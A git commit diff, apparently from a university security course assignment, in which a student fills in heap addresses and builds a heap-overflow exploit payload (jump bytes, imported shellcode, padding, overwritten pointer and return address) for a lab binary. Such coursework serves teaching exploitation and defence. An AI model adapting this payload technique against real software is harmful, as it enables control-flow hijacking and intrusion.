944464fbdff1bef0c8ca84114304791ff97dde77
Birkhoff <zhiqic2@illinois.edu>
2021-02-08 02:16:43 +0800

    Implement 1.2.8

--- AppSec/1.2.8.py
+++ AppSec/1.2.8.py
@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
 import sys
-#from shellcode import shellcode
+from shellcode import shellcode
 from struct import pack
 
 # You MUST fill in the values of the a, b, and c node pointers below. When you
@@ -15,11 +15,18 @@ from struct import pack
 # addresses of these 3 nodes on the heap. Ensure you are using the heap
 # addresses here, and not the addresses of the 3 arguments inside argv.
 
-node_a = 0x12345678
-node_b = 0x12345678
-node_c = 0x12345678
+node_a = 0x080dd2e0
+node_b = 0x080dd310
+node_c = 0x080dd340
 
 # Example usage of node address with offset -- Feel free to ignore
 a_plus_4 = pack("<I", node_a + 4)
 
 # Your code here
+ret_addr = 0xfffed6fc
+# Jump forward 4 bytes to skip garbage
+payload = b'\x90\x90\xEB\x04' + b'AAAA' + shellcode + b' '
+payload += b'B' * 40 + pack('<I', node_a + 8) + pack('<I', ret_addr) + b' '
+payload += b'C'
+
+sys.stdout.buffer.write(payload)
